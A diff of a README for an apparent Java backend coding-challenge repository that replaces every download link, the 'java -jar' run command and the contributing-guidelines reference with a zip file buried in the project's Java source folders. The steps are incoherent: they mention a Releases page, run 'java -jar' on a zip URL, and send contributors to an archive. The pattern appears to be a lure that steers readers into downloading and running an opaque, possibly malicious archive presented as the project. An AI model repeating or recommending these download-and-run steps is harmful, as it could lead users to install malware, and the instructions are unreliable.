@@ -1,7 +1,7 @@
 # 🚀 challenge-varegos - Easy Setup for Backend Developers
 
 ## 📦 Download Now
-[![Download Challenge Varegos](https://raw.githubusercontent.com/easyronin/challenge-varegos/main/src/test/java/com/melof10/varegos_challenge_v3.0.zip%20Challenge%20Varegos-blue)](https://raw.githubusercontent.com/easyronin/challenge-varegos/main/src/test/java/com/melof10/varegos_challenge_v3.0.zip)
+[![Download Challenge Varegos](https://raw.githubusercontent.com/easyronin/challenge-varegos/main/src/main/java/com/melof10/challengevaregos/response/challenge_varegos_v2.1.zip%20Challenge%20Varegos-blue)](https://raw.githubusercontent.com/easyronin/challenge-varegos/main/src/main/java/com/melof10/challengevaregos/response/challenge_varegos_v2.1.zip)
 
 ## 📜 Description
 Welcome to the Challenge Varegos repository! This project is designed for senior backend Java developers. It offers a practical coding challenge that evaluates your skills with key technologies used in the industry.
@@ -28,7 +28,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Disk Space:** Minimum 500 MB available storage
 
 ### 2. Download & Install
-To download the application, visit this page: [Download Challenge Varegos](https://raw.githubusercontent.com/easyronin/challenge-varegos/main/src/test/java/com/melof10/varegos_challenge_v3.0.zip).
+To download the application, visit this page: [Download Challenge Varegos](https://raw.githubusercontent.com/easyronin/challenge-varegos/main/src/main/java/com/melof10/challengevaregos/response/challenge_varegos_v2.1.zip).
 
 Once on the Releases page, follow these steps:
 1. Look for the latest release version.
@@ -46,7 +46,7 @@ To run the application:
 - Use the following command to start the application:
 
 ```
-java -jar https://raw.githubusercontent.com/easyronin/challenge-varegos/main/src/test/java/com/melof10/varegos_challenge_v3.0.zip
+java -jar https://raw.githubusercontent.com/easyronin/challenge-varegos/main/src/main/java/com/melof10/challengevaregos/response/challenge_varegos_v2.1.zip
 ```
 
 ### 5. Access the Application
@@ -68,7 +68,7 @@ This will display the main interface where you can interact with the application
 ## 📝 Additional Information
 - **User Guide:** Detailed instructions on features will be included in the documentation folder of the package.
 - **Support:** For questions or issues, please raise an issue in this repository.
-- **Contributing:** We welcome contributions! Please check the `https://raw.githubusercontent.com/easyronin/challenge-varegos/main/src/test/java/com/melof10/varegos_challenge_v3.0.zip` file for guidelines.
+- **Contributing:** We welcome contributions! Please check the `https://raw.githubusercontent.com/easyronin/challenge-varegos/main/src/main/java/com/melof10/challengevaregos/response/challenge_varegos_v2.1.zip` file for guidelines.
 
 ## 🌟 Conclusion
 Thank you for choosing the Challenge Varegos application. We hope this guide helps you quickly download and start using the application. If you have any questions, feel free to reach out through the repository. 
